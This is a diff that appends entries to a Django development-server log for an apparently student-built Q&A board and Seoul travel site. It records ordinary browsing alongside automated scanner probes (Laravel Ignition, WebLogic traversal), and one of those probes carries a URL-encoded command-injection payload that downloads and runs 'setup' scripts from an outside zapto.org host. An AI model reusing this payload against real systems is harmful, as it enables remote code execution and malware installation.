@@ -8004,3 +8004,717 @@ Watching for file changes with StatReloader
 [11/Mar/2021 17:30:39] "GET /pybo/question/modify/24/ HTTP/1.1" 200 3311
 [11/Mar/2021 17:30:44] "POST /pybo/question/modify/24/ HTTP/1.1" 302 0
 [11/Mar/2021 17:30:44] "GET /pybo/24/ HTTP/1.1" 200 4480
+[11/Mar/2021 18:06:28] code 400, message Bad request version ('À\x14À')
+[11/Mar/2021 18:06:28] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /_ignition/execute-solution
+[11/Mar/2021 18:06:29] "POST /_ignition/execute-solution HTTP/1.1" 404 4575
+Not Found: /console/images/%2e%2e%2fconsole.portal
+[11/Mar/2021 20:33:29] "POST /console/images/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=java.lang.String("ahihi") HTTP/1.1" 404 4694
+Not Found: /console/images/%2E%2E%2Fconsole.portal
+[11/Mar/2021 20:33:30] "POST /console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=java.lang.String("ahihi") HTTP/1.1" 404 4694
+Not Found: /include/makecvs.php
+[11/Mar/2021 20:33:30] "GET /include/makecvs.php?Event=%60php%20-r%20%22file_put_contents%28%5C%22.setup%5C%22%2C%20file_get_contents%28%5C%22http%3A%2F%2Fntxkg0la99w.zapto.org%2Fsetup%5C%22%29%29%3B%22%3Bcurl%20http%3A%2F%2Fntxkg0la99w.zapto.org%2Fsetup%20-O%3Bcurl%20http%3A%2F%2Fntxkg0la99w.zapto.org%2Fsetup.py%20-O%3Bphp%20-r%20%22file_put_contents%28%5C%22.setup.py%5C%22%2C%20file_get_contents%28%5C%22http%3A%2F%2Fntxkg0la99w.zapto.org%2Fsetup.py%5C%22%29%29%3B%22%3Bwget%20http%3A%2F%2Fntxkg0la99w.zapto.org%2Fsetup%20-O%20.setup%3Bwget%20http%3A%2F%2Fntxkg0la99w.zapto.org%2Fsetup.py%20-O%20.setup.py%3Bchmod%20777%20.setup.py%3Bchmod%20777%20.setup%3Bpython2%20.setup.py%7C%7Cpython2.7%20.setup.py%7C%7Cpython%20.setup.py%7C%7C.%2F.setup.py%7C%7C.%2F.setup%60 HTTP/1.1" 404 5275
+Not Found: /zend3/public/
+[11/Mar/2021 20:33:30] "POST /zend3/public/ HTTP/1.1" 404 4536
+Not Found: /api/jsonws/expandocolumn/update-column
+[11/Mar/2021 20:33:31] "POST /api/jsonws/expandocolumn/update-column HTTP/1.1" 404 4611
+/root/FinalProject_complete/pybo/forms.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+March 11, 2021 - 17:17:17
+Django version 3.1.5, using settings 'finalproject.settings'
+Starting development server at http://0.0.0.0:8000/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+/root/FinalProject_complete/pybo/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+March 11, 2021 - 20:57:30
+Django version 3.1.5, using settings 'finalproject.settings'
+Starting development server at http://0.0.0.0:8000/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+/root/FinalProject_complete/pybo/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+March 11, 2021 - 20:58:21
+Django version 3.1.5, using settings 'finalproject.settings'
+Starting development server at http://0.0.0.0:8000/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+/root/FinalProject_complete/pybo/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+March 11, 2021 - 20:58:48
+Django version 3.1.5, using settings 'finalproject.settings'
+Starting development server at http://0.0.0.0:8000/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+[11/Mar/2021 20:59:13] "GET / HTTP/1.1" 200 12907
+Not Found: /favicon.ico
+[11/Mar/2021 20:59:14] "GET /favicon.ico HTTP/1.1" 404 4529
+[11/Mar/2021 20:59:15] "GET /pybo/ HTTP/1.1" 200 4503
+[11/Mar/2021 20:59:15] "GET /pybo/ HTTP/1.1" 200 4503
+[11/Mar/2021 20:59:16] "GET /pybo/question/create/ HTTP/1.1" 200 3257
+[11/Mar/2021 20:59:24] "POST /pybo/question/create/ HTTP/1.1" 200 3567
+[11/Mar/2021 20:59:25] "POST /pybo/question/create/ HTTP/1.1" 302 0
+[11/Mar/2021 20:59:25] "POST /pybo/question/create/ HTTP/1.1" 302 0
+[11/Mar/2021 20:59:25] "GET /pybo/ HTTP/1.1" 200 5431
+[11/Mar/2021 20:59:28] "GET /pybo/25/ HTTP/1.1" 200 4127
+[11/Mar/2021 20:59:30] "GET /pybo/26/ HTTP/1.1" 200 4127
+[11/Mar/2021 20:59:32] "GET /pybo/question/create/ HTTP/1.1" 200 3257
+[11/Mar/2021 20:59:33] "GET /pybo/26/ HTTP/1.1" 200 4127
+[11/Mar/2021 20:59:35] "GET /pybo/question/delete/26/ HTTP/1.1" 302 0
+Not Found: /pybo/question/delete/26/
+[11/Mar/2021 20:59:35] "GET /pybo/question/delete/26/ HTTP/1.1" 404 1769
+[11/Mar/2021 20:59:38] "GET /pybo/25/ HTTP/1.1" 200 4127
+[11/Mar/2021 20:59:39] "GET /pybo/question/delete/25/ HTTP/1.1" 302 0
+Not Found: /pybo/question/delete/25/
+[11/Mar/2021 20:59:39] "GET /pybo/question/delete/25/ HTTP/1.1" 404 1769
+[11/Mar/2021 20:59:43] "GET /pybo/24/ HTTP/1.1" 200 4480
+[11/Mar/2021 20:59:43] "GET /media/images/20212711/html5.png HTTP/1.1" 304 0
+[11/Mar/2021 20:59:44] "GET /pybo/question/delete/24/ HTTP/1.1" 302 0
+[11/Mar/2021 20:59:44] "GET /pybo/ HTTP/1.1" 200 4040
+[11/Mar/2021 20:59:45] "GET /pybo/question/create/ HTTP/1.1" 200 3257
+[11/Mar/2021 20:59:50] "POST /pybo/question/create/ HTTP/1.1" 302 0
+[11/Mar/2021 20:59:50] "POST /pybo/question/create/ HTTP/1.1" 302 0
+[11/Mar/2021 20:59:50] "GET /pybo/ HTTP/1.1" 200 4966
+[11/Mar/2021 20:59:52] "GET /pybo/27/ HTTP/1.1" 200 4122
+[11/Mar/2021 20:59:53] "GET /pybo/question/delete/27/ HTTP/1.1" 302 0
+Not Found: /pybo/question/delete/27/
+[11/Mar/2021 20:59:53] "GET /pybo/question/delete/27/ HTTP/1.1" 404 1769
+[11/Mar/2021 20:59:54] "GET /pybo/question/create/ HTTP/1.1" 200 3257
+[11/Mar/2021 20:59:55] "GET /pybo/question/create/ HTTP/1.1" 200 3257
+Not Found: /pybo/question/c
+[11/Mar/2021 20:59:58] "GET /pybo/question/c HTTP/1.1" 404 6049
+Not Found: /pybo/question/
+[11/Mar/2021 20:59:59] "GET /pybo/question/ HTTP/1.1" 404 6046
+[11/Mar/2021 21:00:02] "GET /pybo/ HTTP/1.1" 200 4503
+[11/Mar/2021 21:00:03] "GET /pybo/28/ HTTP/1.1" 200 4122
+[11/Mar/2021 21:00:04] "GET /pybo/question/delete/28/ HTTP/1.1" 302 0
+[11/Mar/2021 21:00:05] "GET /pybo/ HTTP/1.1" 200 4040
+[11/Mar/2021 21:00:06] "GET /pybo/question/create/ HTTP/1.1" 200 3257
+[11/Mar/2021 21:00:25] "POST /pybo/question/create/ HTTP/1.1" 302 0
+[11/Mar/2021 21:00:25] "GET /pybo/ HTTP/1.1" 200 4506
+[11/Mar/2021 21:00:27] "GET /pybo/29/ HTTP/1.1" 200 4278
+[11/Mar/2021 21:00:27] "GET /media/images/20210011/%EB%8B%A4%EC%9D%B4%EC%96%B4%EA%B7%B8%EB%9E%A8.png HTTP/1.1" 200 60509
+[11/Mar/2021 21:00:30] "GET /pybo/question/modify/29/ HTTP/1.1" 200 3292
+[11/Mar/2021 21:00:31] "POST /pybo/question/modify/29/ HTTP/1.1" 302 0
+[11/Mar/2021 21:00:31] "GET /pybo/29/ HTTP/1.1" 200 4501
+[11/Mar/2021 21:00:31] "GET /media/images/20210011/%EB%8B%A4%EC%9D%B4%EC%96%B4%EA%B7%B8%EB%9E%A8.png HTTP/1.1" 304 0
+[11/Mar/2021 21:00:33] "GET /pybo/question/modify/29/ HTTP/1.1" 200 3292
+[11/Mar/2021 21:00:46] "POST /pybo/question/modify/29/ HTTP/1.1" 302 0
+[11/Mar/2021 21:00:46] "GET /pybo/29/ HTTP/1.1" 200 4464
+[11/Mar/2021 21:00:46] "GET /media/images/20210011/javascri.png HTTP/1.1" 200 5096
+[11/Mar/2021 21:00:52] "GET /pybo/question/delete/29/ HTTP/1.1" 302 0
+[11/Mar/2021 21:00:52] "GET /pybo/ HTTP/1.1" 200 4040
+[11/Mar/2021 21:00:55] "GET /common/logout/ HTTP/1.1" 302 0
+[11/Mar/2021 21:00:55] "GET /pybo/ HTTP/1.1" 200 4005
+[11/Mar/2021 21:01:01] "GET /pybo/23/ HTTP/1.1" 200 3848
+[11/Mar/2021 21:01:53] "GET /pybo/question/create/ HTTP/1.1" 302 0
+[11/Mar/2021 21:01:53] "GET /common/login/?next=/pybo/question/create/ HTTP/1.1" 200 3377
+[11/Mar/2021 21:01:58] "POST /common/login/ HTTP/1.1" 302 0
+[11/Mar/2021 21:01:58] "GET /pybo/question/create/ HTTP/1.1" 200 3257
+[11/Mar/2021 21:02:35] "POST /pybo/question/create/ HTTP/1.1" 302 0
+[11/Mar/2021 21:02:35] "GET /pybo/ HTTP/1.1" 200 4510
+[11/Mar/2021 21:02:44] "GET / HTTP/1.1" 200 12907
+[11/Mar/2021 21:02:46] "GET /static/%EB%82%A8%EC%82%B0%ED%83%80%EC%9B%8C.jpg HTTP/1.1" 200 596246
+[11/Mar/2021 21:02:47] "GET /static/hangg.jpg HTTP/1.1" 200 59964
+[11/Mar/2021 21:02:47] "GET /static/seoulpic.png HTTP/1.1" 200 36963
+[11/Mar/2021 21:02:47] "GET /static/contactus.png HTTP/1.1" 200 50673
+[11/Mar/2021 21:02:47] "GET /static/%EC%84%B8%EC%A2%85%EB%8C%80%EC%99%95%EB%8B%98.jpg HTTP/1.1" 200 249361
+[11/Mar/2021 21:02:47] "GET /static/program.png HTTP/1.1" 200 118377
+[11/Mar/2021 21:02:47] "GET /static/%EA%B0%95%EC%9B%90%EB%8F%84.jpg HTTP/1.1" 200 212402
+[11/Mar/2021 21:02:47] "GET /static/codingon.png HTTP/1.1" 200 9791
+[11/Mar/2021 21:02:50] "GET /pybo/ HTTP/1.1" 200 4475
+[11/Mar/2021 21:04:40] "GET /pybo/?page=1 HTTP/1.1" 200 4510
+[11/Mar/2021 21:04:43] "GET /pybo/30/ HTTP/1.1" 200 4264
+[11/Mar/2021 21:04:45] "GET / HTTP/1.1" 200 12907
+----------------------------------------
+Exception happened during processing of request from ('58.229.38.181', 38717)
+----------------------------------------
+Exception happened during processing of request from ('58.229.38.181', 38718)
+----------------------------------------
+Exception happened during processing of request from ('58.229.38.181', 38710)
+----------------------------------------
+Exception happened during processing of request from ('58.229.38.181', 38716)
+----------------------------------------
+Exception happened during processing of request from ('58.229.38.181', 38715)
+----------------------------------------
+Exception happened during processing of request from ('58.229.38.181', 38711)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/usr/local/lib/python3.6/dist-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/usr/local/lib/python3.6/dist-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/usr/local/lib/python3.6/dist-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/usr/local/lib/python3.6/dist-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/usr/local/lib/python3.6/dist-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/usr/local/lib/python3.6/dist-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/usr/local/lib/python3.6/dist-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/usr/local/lib/python3.6/dist-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/usr/local/lib/python3.6/dist-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/usr/local/lib/python3.6/dist-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/usr/local/lib/python3.6/dist-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/usr/local/lib/python3.6/dist-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[11/Mar/2021 21:16:50] code 400, message Bad request version ('À\x14À')
+[11/Mar/2021 21:16:50] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /_ignition/execute-solution
+[11/Mar/2021 21:16:50] "POST /_ignition/execute-solution HTTP/1.1" 404 4575
+[11/Mar/2021 22:41:45] code 400, message Bad request syntax ("\x16\x03\x01\x00\x7f\x01\x00\x00{\x03\x03\x80\x15|\x98PË÷\x06Ø\x93>\x1e\x97ð°\x00ö\x1dW±Ùò'¼\\':;\x01!\x19Ä\x00\x00\x1cÀ/À+À0À,À\x13À\tÀ\x14À")
+[11/Mar/2021 22:41:45] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /_ignition/execute-solution
+[11/Mar/2021 22:41:47] "POST /_ignition/execute-solution HTTP/1.1" 404 4575
+[11/Mar/2021 23:37:55] "GET / HTTP/1.1" 200 12907
+[11/Mar/2021 23:37:56] "GET /static/hangg.jpg HTTP/1.1" 200 59964
+[11/Mar/2021 23:37:56] "GET /static/%EB%82%A8%EC%82%B0%ED%83%80%EC%9B%8C.jpg HTTP/1.1" 200 596246
+[11/Mar/2021 23:37:56] "GET /static/%EC%84%B8%EC%A2%85%EB%8C%80%EC%99%95%EB%8B%98.jpg HTTP/1.1" 200 249361
+[11/Mar/2021 23:37:56] "GET /static/seoulpic.png HTTP/1.1" 200 36963
+[11/Mar/2021 23:37:56] "GET /static/program.png HTTP/1.1" 200 118377
+[11/Mar/2021 23:37:56] "GET /static/contactus.png HTTP/1.1" 200 50673
+[11/Mar/2021 23:37:56] "GET /static/%EA%B0%95%EC%9B%90%EB%8F%84.jpg HTTP/1.1" 200 212402
+[11/Mar/2021 23:37:56] "GET /static/codingon.png HTTP/1.1" 200 9791
+Not Found: /favicon.ico
+[11/Mar/2021 23:37:56] "GET /favicon.ico HTTP/1.1" 404 4529
+Not Found: /_ignition/execute-solution
+[12/Mar/2021 06:50:42] "POST /_ignition/execute-solution HTTP/1.1" 404 4575
+[12/Mar/2021 06:50:44] code 400, message Bad request syntax ('\x16\x03\x01\x00\x7f\x01\x00\x00{\x03\x03<qÇ\x83?cRÏT\x1e¯\x01ë¼\x80ËÌb`|enÔÎ®\x08\x89¬ÐGþ\x8b\x00\x00\x1cÀ/À+À0À,À\x13À\tÀ\x14À')
+[12/Mar/2021 06:50:44] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[12/Mar/2021 09:48:50] "GET / HTTP/1.1" 200 12907
+[12/Mar/2021 13:45:33] code 400, message Bad request syntax ('\x16\x03\x01\x00\x7f\x01\x00\x00{\x03\x03\x0bA\x07ñq\\[\x9cEþ\x90ÝþÀ\x1b¦µåQ{Ú\x9c\x99Ê9e2CòÄ½T\x00\x00\x1cÀ/À+À0À,À\x13À\tÀ\x14À')
+[12/Mar/2021 13:45:33] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /_ignition/execute-solution
+[12/Mar/2021 13:45:33] "POST /_ignition/execute-solution HTTP/1.1" 404 4575
+[12/Mar/2021 14:24:20] "GET / HTTP/1.1" 200 12907
+Not Found: /favicon.ico
+[12/Mar/2021 14:24:20] "GET /favicon.ico HTTP/1.1" 404 4529
+[12/Mar/2021 14:24:22] "GET /hotplaces/ HTTP/1.1" 200 8209
+Not Found: /humanframe/theme/basic/assets/images/img/pavi_16_16.png
+[12/Mar/2021 14:24:22] "GET /humanframe/theme/basic/assets/images/img/pavi_16_16.png HTTP/1.1" 404 4661
+[12/Mar/2021 14:24:25] "GET /hotplaces/bukchon/ HTTP/1.1" 200 23575
+[12/Mar/2021 14:25:53] "GET /hotplaces/lotteworld/ HTTP/1.1" 200 22578
+[12/Mar/2021 14:26:58] code 400, message Bad request version ('À\x14À')
+[12/Mar/2021 14:26:58] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /_ignition/execute-solution
+[12/Mar/2021 14:26:58] "POST /_ignition/execute-solution HTTP/1.1" 404 4575
+[12/Mar/2021 14:31:08] "GET /hotplaces/palace/ HTTP/1.1" 200 23978
+[12/Mar/2021 14:31:29] "GET /hotplaces/palace/ HTTP/1.1" 200 23978
+[12/Mar/2021 14:37:55] "GET /hotplaces/palace/ HTTP/1.1" 200 23978
+[12/Mar/2021 14:38:05] "GET /hotplaces/63building/ HTTP/1.1" 200 22896
+Not Found: /hotplaces/63building/codingon.png
+[12/Mar/2021 14:38:05] "GET /hotplaces/63building/codingon.png HTTP/1.1" 404 4595
+[12/Mar/2021 14:39:31] "GET /hotplaces/63building/ HTTP/1.1" 200 22904
+Not Found: /hotplaces/63building/codingon.png
+[12/Mar/2021 14:39:31] "GET /hotplaces/63building/codingon.png HTTP/1.1" 404 4595
+[12/Mar/2021 14:39:33] "GET / HTTP/1.1" 200 12907
+[12/Mar/2021 14:39:35] "GET /introduction/ HTTP/1.1" 200 10157
+[12/Mar/2021 14:39:36] "GET /region/ HTTP/1.1" 200 12495
+[12/Mar/2021 14:39:38] "GET /hotplaces HTTP/1.1" 301 0
+[12/Mar/2021 14:39:38] "GET /hotplaces/ HTTP/1.1" 200 8209
+[12/Mar/2021 14:39:41] "GET /hotplaces/63building/ HTTP/1.1" 200 22904
+Not Found: /hotplaces/63building/codingon.png
+[12/Mar/2021 14:39:41] "GET /hotplaces/63building/codingon.png HTTP/1.1" 404 4595
+[12/Mar/2021 14:40:36] "GET /hotplaces/63building/ HTTP/1.1" 200 22904
+Not Found: /hotplaces/63building/codingon.png
+[12/Mar/2021 14:40:36] "GET /hotplaces/63building/codingon.png HTTP/1.1" 404 4595
+[12/Mar/2021 14:40:42] "GET /hotplaces/bukchon/ HTTP/1.1" 200 22904
+Not Found: /hotplaces/bukchon/codingon.png
+[12/Mar/2021 14:40:42] "GET /hotplaces/bukchon/codingon.png HTTP/1.1" 404 4586
+[12/Mar/2021 14:40:47] "GET /hotplaces/bukchon/ HTTP/1.1" 200 22904
+Not Found: /hotplaces/bukchon/codingon.png
+[12/Mar/2021 14:40:47] "GET /hotplaces/bukchon/codingon.png HTTP/1.1" 404 4586
+[12/Mar/2021 14:46:57] "GET / HTTP/1.1" 200 12907
+[12/Mar/2021 14:46:59] "GET /hotplaces/ HTTP/1.1" 200 8209
+[12/Mar/2021 14:47:00] "GET /hotplaces/bukchon/ HTTP/1.1" 200 23583
+[12/Mar/2021 14:47:04] "GET /hotplaces/myeongdong/ HTTP/1.1" 200 23228
+[12/Mar/2021 14:50:28] "GET / HTTP/1.1" 200 12907
+[12/Mar/2021 14:50:30] "GET /hotplaces/ HTTP/1.1" 200 8209
+[12/Mar/2021 14:50:32] "GET /hotplaces/bukchon/ HTTP/1.1" 200 16471
+Not Found: /hotplaces/bukchon/codingon.png
+[12/Mar/2021 14:50:32] "GET /hotplaces/bukchon/codingon.png HTTP/1.1" 404 4586
+Not Found: /hotplaces/bukchon/codingon.png
+[12/Mar/2021 14:51:18] "GET /hotplaces/bukchon/codingon.png HTTP/1.1" 404 4586
+[12/Mar/2021 14:51:29] "GET /hotplaces/bukchon/ HTTP/1.1" 200 23583
+[12/Mar/2021 14:51:32] "GET /introduction/ HTTP/1.1" 200 10157
+[12/Mar/2021 14:51:34] "GET /hotplaces/ HTTP/1.1" 200 8209
+[12/Mar/2021 14:51:35] "GET /hotplaces/palace/ HTTP/1.1" 200 23978
+[12/Mar/2021 14:51:37] "GET /hotplaces/ntower/ HTTP/1.1" 200 23784
+[12/Mar/2021 14:51:41] "GET /hotplaces/lotteworld/ HTTP/1.1" 200 23861
+[12/Mar/2021 14:51:44] "GET /hotplaces/63building/ HTTP/1.1" 200 22878
+Not Found: /hotplaces/63building/codingon.png
+[12/Mar/2021 14:51:44] "GET /hotplaces/63building/codingon.png HTTP/1.1" 404 4595
+[12/Mar/2021 14:51:48] "GET /hotplaces/myeongdong/ HTTP/1.1" 200 23228
+[12/Mar/2021 14:51:51] "GET /hotplaces/bukchon/ HTTP/1.1" 200 23583
+[12/Mar/2021 14:51:54] "GET /hotplaces/myeongdong/ HTTP/1.1" 200 23228
+[12/Mar/2021 16:32:27] "GET / HTTP/1.1" 200 12907
+[12/Mar/2021 16:32:29] "GET /region/ HTTP/1.1" 200 12495
+[12/Mar/2021 16:32:31] "GET /introduction/ HTTP/1.1" 200 10157
+[12/Mar/2021 16:32:32] "GET /hotplaces/ HTTP/1.1" 200 8209
+[12/Mar/2021 16:32:34] "GET /pybo/ HTTP/1.1" 200 4510
+[12/Mar/2021 16:32:41] "GET /common/logout/ HTTP/1.1" 302 0
+[12/Mar/2021 16:32:41] "GET /pybo/ HTTP/1.1" 200 4475
+[12/Mar/2021 16:32:50] "GET /common/login/ HTTP/1.1" 200 3355
+[12/Mar/2021 16:32:54] "POST /common/login/ HTTP/1.1" 302 0
+[12/Mar/2021 16:32:54] "GET /pybo HTTP/1.1" 301 0
+[12/Mar/2021 16:32:54] "GET /pybo/ HTTP/1.1" 200 4510
+[12/Mar/2021 16:33:01] "GET /pybo/ HTTP/1.1" 200 4475
+Not Found: /favicon.ico
+[12/Mar/2021 16:33:02] "GET /favicon.ico HTTP/1.1" 404 4529
+[12/Mar/2021 16:33:06] "GET /common/logout/ HTTP/1.1" 302 0
+[12/Mar/2021 16:33:06] "GET /pybo/ HTTP/1.1" 200 4475
+[12/Mar/2021 16:33:15] "GET /pybo/23/ HTTP/1.1" 200 3848
+[12/Mar/2021 16:33:17] "GET /pybo/30/ HTTP/1.1" 200 3966
+[12/Mar/2021 16:33:28] "POST /pybo/answer/create/30/ HTTP/1.1" 302 0
+[12/Mar/2021 16:33:28] "GET /common/login/?next=/pybo/answer/create/30/ HTTP/1.1" 200 3378
+[12/Mar/2021 16:33:29] "GET / HTTP/1.1" 200 12907
+[12/Mar/2021 16:33:31] "GET /introduction/ HTTP/1.1" 200 10157
+[12/Mar/2021 17:02:01] code 400, message Bad request syntax ('\x16\x03\x01\x00\x7f\x01\x00\x00{\x03\x03ù\xadþ\x1e3[|âò¼[=)\x81âj¡Eõ,Òr\x01\x15¦y¦aÌ\x97LÔ\x00\x00\x1cÀ/À+À0À,À\x13À\tÀ\x14À')
+[12/Mar/2021 17:02:01] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /_ignition/execute-solution
+[12/Mar/2021 17:02:01] "POST /_ignition/execute-solution HTTP/1.1" 404 4575
+[12/Mar/2021 17:47:59] code 400, message Bad request syntax ('\x16\x03\x01\x00\x7f\x01\x00\x00{\x03\x03wbÖ«W6}uP\x99¬6r¡\x1fB·\x15\x17vÓ\x89w\x84W\x8eÛì¥\x0c=\x0f\x00\x00\x1cÀ/À+À0À,À\x13À\tÀ\x14À')
+[12/Mar/2021 17:47:59] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /_ignition/execute-solution
+[12/Mar/2021 17:47:59] "POST /_ignition/execute-solution HTTP/1.1" 404 4575
+[12/Mar/2021 18:59:47] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00\x7f\x01\x00\x00{\x03\x03')
+[12/Mar/2021 18:59:47] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /_ignition/execute-solution
+[12/Mar/2021 18:59:47] "POST /_ignition/execute-solution HTTP/1.1" 404 4575
+[12/Mar/2021 20:07:03] code 400, message Bad request syntax ('\x16\x03\x01\x00\x7f\x01\x00\x00{\x03\x03Ò{S©\x8aùT§\x16¬\x8a\x92__\x0cP\x00;Si\x88\x0cN\x95Ùq\xad\x9d\x0bÛL\x1e\x00\x00\x1cÀ/À+À0À,À\x13À\tÀ\x14À')
+[12/Mar/2021 20:07:03] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /_ignition/execute-solution
+[12/Mar/2021 20:07:03] "POST /_ignition/execute-solution HTTP/1.1" 404 4575
+[12/Mar/2021 21:39:19] "GET / HTTP/1.1" 200 12907
+[12/Mar/2021 21:39:19] "GET /static/hangg.jpg HTTP/1.1" 200 59964
+[12/Mar/2021 21:39:19] "GET /static/seoulpic.png HTTP/1.1" 200 36963
+[12/Mar/2021 21:39:19] "GET /static/program.png HTTP/1.1" 200 118377
+[12/Mar/2021 21:39:19] "GET /static/%EB%82%A8%EC%82%B0%ED%83%80%EC%9B%8C.jpg HTTP/1.1" 200 596246
+[12/Mar/2021 21:39:19] "GET /static/%EC%84%B8%EC%A2%85%EB%8C%80%EC%99%95%EB%8B%98.jpg HTTP/1.1" 200 249361
+[12/Mar/2021 21:39:19] "GET /static/%EA%B0%95%EC%9B%90%EB%8F%84.jpg HTTP/1.1" 200 212402
+[12/Mar/2021 21:39:20] "GET / HTTP/1.1" 200 12907
+[12/Mar/2021 21:39:20] "GET /static/hangg.jpg HTTP/1.1" 200 59964
+[12/Mar/2021 21:39:20] "GET /static/seoulpic.png HTTP/1.1" 200 36963
+[12/Mar/2021 21:39:20] "GET /static/program.png HTTP/1.1" 200 118377
+[12/Mar/2021 21:39:20] "GET /static/%EA%B0%95%EC%9B%90%EB%8F%84.jpg HTTP/1.1" 200 212402
+[12/Mar/2021 21:39:20] "GET /static/contactus.png HTTP/1.1" 200 50673
+[12/Mar/2021 21:39:20] "GET /static/codingon.png HTTP/1.1" 200 9791
+[12/Mar/2021 21:39:20] "GET /static/%EC%84%B8%EC%A2%85%EB%8C%80%EC%99%95%EB%8B%98.jpg HTTP/1.1" 200 249361
+[12/Mar/2021 21:39:20] "GET /static/%EB%82%A8%EC%82%B0%ED%83%80%EC%9B%8C.jpg HTTP/1.1" 200 596246
+Not Found: /favicon.ico
+[12/Mar/2021 21:39:21] "GET /favicon.ico HTTP/1.1" 404 4529
+[12/Mar/2021 21:39:43] "POST / HTTP/1.1" 200 12950
+[12/Mar/2021 21:39:48] "GET /introduction/ HTTP/1.1" 200 10157
+Not Found: /favicon.ico
+[12/Mar/2021 21:39:50] "GET /favicon.ico HTTP/1.1" 404 4529
+[12/Mar/2021 21:39:55] "GET /pybo/ HTTP/1.1" 200 4475
+Not Found: /favicon.ico
+[12/Mar/2021 21:39:55] "GET /favicon.ico HTTP/1.1" 404 4529
+[12/Mar/2021 21:39:59] "GET /pybo/23/ HTTP/1.1" 200 3848
+Not Found: /favicon.ico
